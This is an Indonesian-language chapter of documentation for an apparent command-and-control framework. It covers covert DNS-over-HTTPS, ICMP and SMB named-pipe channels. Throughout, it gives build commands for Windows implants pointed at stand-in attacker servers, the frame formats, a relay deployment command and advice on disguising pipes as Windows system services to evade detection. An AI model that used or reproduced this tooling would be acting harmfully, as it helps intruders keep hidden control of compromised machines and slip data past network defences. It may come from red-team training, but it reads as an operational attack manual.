# 19 — Advanced C2 Transports: DoH, ICMP, SMB Named Pipe

> Transport alternatif untuk situasi di mana HTTP/HTTPS ke server C2 diblokir atau
> mudah dideteksi. Setiap transport memanfaatkan protokol yang berbeda sebagai covert channel.

---

## Ringkasan Transport

| Transport | Protokol | Port | Kapan Dipakai | Build Target |
|-----------|----------|------|---------------|--------------|
| HTTP/HTTPS | TCP 80/443 | Bebas | Default | `agent-win-stealth` |
| DNS-over-HTTPS | HTTPS ke DNS resolver publik | 443 | Hanya DNS keluar diizinkan | `agent-win-doh` |
| ICMP | ICMP Echo | — | TCP diblokir total | `agent-win-icmp` |
| SMB Named Pipe | SMB 445 | — | Pivot internal, mesin tanpa internet | `agent-win-smb` |

---

## Transport 1: DNS-over-HTTPS (DoH)

### Cara Kerja

Payload di-encode ke dalam DNS TXT queries yang dikirim ke resolver publik
(Cloudflare atau Google) melalui HTTPS. Resolver meneruskan DNS query ke server
C2 yang berfungsi sebagai authoritative DNS server untuk domain yang dikuasai.

```
Agent                Cloudflare DoH Resolver         C2 Server
  │                        │                              │
  │  HTTPS POST            │                              │
  │  dns-query?name=       │                              │
  │   data.chunk1.c2.com   │                              │
  │  &type=TXT             │                              │
  │───────────────────────►│                              │
  │                        │  DNS query: data.chunk1.c2.com TXT?
  │                        │─────────────────────────────►│
  │                        │                              │ return TXT record
  │                        │  TXT: "ack:ok"               │ (isi command/ack)
  │                        │◄─────────────────────────────│
  │  HTTPS 200: TXT data   │                              │
  │◄───────────────────────│                              │
```

### Format Encoding

- Payload di-split per 63 karakter (max DNS label length)
- Setiap chunk di-encode base32 (DNS-safe charset)
- Format: `<chunk>.<session-id>.<c2-domain>`
- Poll: `poll.<session-id>.<c2-domain>` TXT query

### Build Agent DoH

```bash
# Daftarkan domain ke C2 server sebagai authoritative NS
# Di registrar: ns1.c2domain.com → IP_C2_SERVER

make agent-win-doh \
  C2_SERVER=c2domain.com \
  ENC_KEY=DoHSecretKey2026 \
  TRANSPORT=doh \
  DOH_PROVIDER=cloudflare \
  INTERVAL=120 \
  JITTER=40
```

**Output:**
```
[*] Building Windows DoH agent...
    C2 Domain    : c2domain.com
    DoH Provider : cloudflare (cloudflare-dns.com/dns-query)
    Interval     : 120s  Jitter: 40%
[+] Agent: bin/agent_windows_doh.exe (9.1 MB)
```

### Pilih Provider DoH

| Provider | Endpoint | Keterangan |
|----------|----------|------------|
| `cloudflare` | `cloudflare-dns.com/dns-query` | Paling umum, sulit diblokir |
| `google` | `dns.google/resolve` | Alternatif, port 443 ke Google |

```bash
make agent-win-doh DOH_PROVIDER=google C2_SERVER=c2domain.com ENC_KEY=...
```

### Setup Server (Authoritative DNS)

Server C2 harus dikonfigurasi sebagai authoritative DNS server untuk domain:

```bash
# Contoh konfigurasi minimal (server sudah handle DNS via internal resolver)
# Agent akan dapat TXT record berisi payload terenkripsi

# Test resolusi TXT dari luar
dig @8.8.8.8 poll.sessionabc123.c2domain.com TXT
# Harusnya return TXT record dari C2 server
```

### Karakteristik DoH

- Traffic: HTTPS ke `1.1.1.1:443` (Cloudflare) — terlihat normal
- Payload size: terbatas oleh max DNS label/TXT record length
- Latency: lebih tinggi dari HTTP (multiple DNS round-trips per payload chunk)
- Deteksi: sangat sulit — HTTPS ke trusted resolver publik
- Firewall bypass: 99.9% jaringan enterprise izinkan HTTPS ke `1.1.1.1`

---

## Transport 2: ICMP Echo

### Cara Kerja

Payload disisipkan di ICMP echo request dan reply payload. Agent menggunakan
`IcmpSendEcho2` Windows API (dari `iphlpapi.dll`) — tidak butuh raw socket
atau privilege administrator.

```
Agent                                       C2 Server
  │                                              │
  │  ICMP Echo Request                           │
  │  payload: [MAGIC:TBUC][seq][total][idx][data]│
  │─────────────────────────────────────────────►│
  │                                              │
  │  ICMP Echo Reply                             │
  │  payload: [MAGIC:TBUC][seq][total][idx][data]│
  │◄─────────────────────────────────────────────│
```

### Frame Format

```
Bytes 0-3  : Magic "TBUC" (0x54425543) — penanda frame Taburtuai
Bytes 4-5  : Sequence number (uint16, little-endian)
Bytes 6-7  : Total chunks (uint16)
Byte  8    : Chunk index
Bytes 9+   : Encrypted payload data
```

### Build Agent ICMP

```bash
make agent-win-icmp \
  C2_SERVER=203.0.113.50 \
  ENC_KEY=IcmpC2Key2026 \
  TRANSPORT=icmp \
  INTERVAL=120 \
  JITTER=30
```

**Output:**
```
[*] Building Windows ICMP agent (Windows-only transport)...
    Server IP : 203.0.113.50
    Interval  : 120s  Jitter: 30%
[+] Agent: bin/agent_windows_icmp.exe (8.7 MB)
```

> **Catatan:** ICMP transport hanya tersedia di agent Windows.
> Build ini tidak berfungsi di Linux/macOS.

### Setup Server untuk ICMP

C2 server perlu bisa menerima ICMP dan memiliki IP publik yang bisa di-ping dari target.
Server tidak perlu konfigurasi khusus — ICMP handler dibangun ke dalam binary server.

```bash
# Pastikan ICMP tidak diblokir di firewall VPS
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT
```

### Karakteristik ICMP

- Tidak ada TCP/UDP connection (sulit dideteksi firewall stateful)
- Beberapa jaringan blokir outbound ICMP — test dulu dengan `ping`
- Throughput rendah — cocok untuk command, tidak untuk transfer file besar
- Deteksi: payload analysis pada ICMP bisa mendeteksi data di luar echo pattern normal
- **Tidak butuh admin** — menggunakan `IcmpSendEcho2` bukan raw socket

---

## Transport 3: SMB Named Pipe

### Cara Kerja

Agent terhubung ke named pipe di **relay host** (mesin perantara yang bisa akses
SMB internal). Relay mem-proxy pesan ke C2 server melalui HTTPS.

```
                     ┌── Internal Network ──┐
Agent (no internet)  │                      │  DMZ/Relay Host      C2 Server
    │                │                      │      │                    │
    │  SMB connect   │                      │      │                    │
    │  \\relay\pipe\ │                      │      │                    │
    │  svcctl        │                      │      │                    │
    │────────────────────────────────────── ►│      │                    │
    │                │                      │      │  HTTPS POST        │
    │                │                      │      │──────────────────► │
    │                │                      │      │                    │  process
    │                │                      │      │  HTTPS 200         │
    │                │                      │      │◄────────────────── │
    │  SMB response  │                      │      │                    │
    │◄────────────────────────────────────── │      │                    │
```

### Frame Format SMB

```
Bytes 0-3  : Magic "TBUP" (0x54425550) — penanda frame
Byte  4    : Type (0x01=send, 0x02=poll, 0x03=response)
Bytes 5-8  : Payload length (uint32, little-endian)
Bytes 9+   : Encrypted payload
```

### Setup Relay (smb_relay.exe)

Deploy relay binary di mesin DMZ yang bisa reach ke internal network via SMB:

```bash
# Build relay binary
make smb-relay
# Output: bin/smb_relay.exe

# Deploy ke relay host (via RDP, file share, atau agent lain)
# Jalankan di relay host:
.\smb_relay.exe \
  --pipe svcctl \
  --c2 https://c2.yourdomain.com \
  --key EnterpriseC2Key2026 \
  --instances 10
```

**Output relay:**
```
[*] SMB Named Pipe Relay starting...
[*] Pipe   : \\.\pipe\svcctl
[*] C2     : https://c2.yourdomain.com
[*] Workers: 10 simultaneous connections
[+] Listening on \\.\pipe\svcctl
[+] Ready to proxy connections to C2.
```

### Build Agent SMB

```bash
make agent-win-smb \
  ENC_KEY=EnterpriseC2Key2026 \
  TRANSPORT=smb \
  SMB_RELAY=10.10.5.20 \
  SMB_PIPE=svcctl \
  INTERVAL=60 \
  JITTER=20
```

**Output:**
```
[*] Building Windows SMB agent...
    Relay host : 10.10.5.20
    Pipe name  : svcctl
    Interval   : 60s  Jitter: 20%
[+] Agent: bin/agent_windows_smb.exe (8.9 MB)
```

### Konfigurasi OPSEC untuk SMB

**Nama pipe yang bagus (menyatu dengan Windows):**
- `svcctl` — Service Control Manager
- `srvsvc` — Server Service
- `samr` — Security Account Manager RPC
- `lsarpc` — Local Security Authority RPC
- `browser` — Computer Browser

```bash
# Gunakan nama pipe yang legitimate
make agent-win-smb SMB_PIPE=svcctl SMB_RELAY=10.10.5.20 ENC_KEY=...
```

### Karakteristik SMB

- Memanfaatkan SMB yang sering diizinkan di jaringan internal
- Tidak perlu internet di agent — cocok untuk air-gapped internal network
- Butuh relay host dengan akses ke C2 internet
- Deteksi: SMB ke host internal adalah traffic normal

---

## Perbandingan Semua Transport

| Aspek | HTTP/HTTPS | DoH | ICMP | SMB |
|-------|-----------|-----|------|-----|
| Butuh internet di agent | Ya | Ya | Ya | Tidak |
| Port yang dipakai | 80/443 | 443 | — | 445 |
| Bypass egress filter | Tidak | Ya (DNS) | Ya (ICMP) | Ya (internal SMB) |
| Throughput | Tinggi | Rendah | Sangat rendah | Sedang |
| Latency | Rendah | Sedang | Sedang | Rendah |
| Deteksi kesulitan | Sedang | Tinggi | Tinggi | Tinggi |
| Platform agent | Win/Lin/Mac | Win/Lin/Mac | Windows only | Windows only |
| Setup kompleksitas | Rendah | Sedang | Rendah | Tinggi (butuh relay) |

---

## Pilih Transport yang Tepat

```
Apakah mesin target punya akses TCP ke internet?
├── Ya → Gunakan HTTP/HTTPS (default, mudah)
│
└── Tidak
    │
    ├── Apakah HTTPS ke resolver publik (1.1.1.1) diizinkan?
    │   ├── Ya → Gunakan DoH (DNS-over-HTTPS)
    │   └── Tidak
    │       │
    │       ├── Apakah ICMP outbound diizinkan?
    │       │   ├── Ya → Gunakan ICMP
    │       │   └── Tidak
    │       │       └── Apakah ada relay host via SMB?
    │       │           ├── Ya → Gunakan SMB Named Pipe
    │       │           └── Tidak → Tidak ada C2 channel (physical only)
    │
    └── Internal network only (no internet at all)
        └── Apakah ada relay host via SMB di DMZ?
            ├── Ya → Gunakan SMB Named Pipe
            └── Tidak → Physical access required
```

---

**Selanjutnya:** [20 — Multi-Operator Team Server](20-teamserver.md)
